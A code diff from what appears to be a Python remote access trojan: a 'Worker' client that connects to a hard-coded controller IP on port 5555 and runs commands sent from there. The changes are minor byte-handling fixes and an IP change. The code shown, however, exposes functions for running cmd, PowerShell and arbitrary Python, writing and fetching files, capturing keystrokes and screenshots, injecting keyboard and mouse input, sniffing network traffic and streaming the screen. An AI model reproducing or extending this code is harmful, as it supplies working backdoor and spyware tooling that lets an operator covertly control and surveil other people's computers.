@@ -9,7 +9,6 @@ import keyboard
 from pynput.mouse import Button,Controller
 from scapy.all import sniff
 from scapy.utils import wrpcap
-import sys
 import mss
 import numpy as np
 import cv2
@@ -27,10 +26,10 @@ def python(code:str)->bytes:
         return "successfully ran your code on the worker".encode()
     except Exception as e:
         return f"error in execution: {e}".encode()
-def send_file(file_str: str) ->bytes:
-    data = file_str.split(":",1)
-    file_name:str = data[0]
-    file_bytes:bytes =data[1].encode()
+def send_file(file_str: bytes) ->bytes:
+    data = file_str.split(b":",1)
+    file_name:str = data[0].decode()
+    file_bytes:bytes =data[1]
     try:
         with open(file_name, "wb") as file:
             file.write(file_bytes)
@@ -128,7 +127,7 @@ class Worker:
         data = b""
         while len(data) < size:
             packet = self.client.recv(size - len(data))
-            if not packet:  # connection closed
+            if not packet:
                 return b""
             data += packet
         return data
@@ -149,19 +148,22 @@ class Worker:
             data = self.receiver()
             if data == "quit":
                 break
-            if ":" in data:
-                splitted = data.split(":",1)
-                name = splitted[0]
+            if b":" in data:
+                splitted = data.split(b":",1)
+                name = splitted[0].decode()
                 commend = splitted[1]
             else:
                 name = commend = data
-            message = self.functions[name](commend)
+            if name == "send_file":
+                message = send_file(commend)
+            else:
+                message = self.functions[name](commend.decode())
             self.sender(message)
         self.client.close()
 
 
 def main():
-    ip = "10.0.0.3"
+    ip = "10.0.0.10"
     port = 5555
     functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
     worker = Worker(ip, int(port), functions)
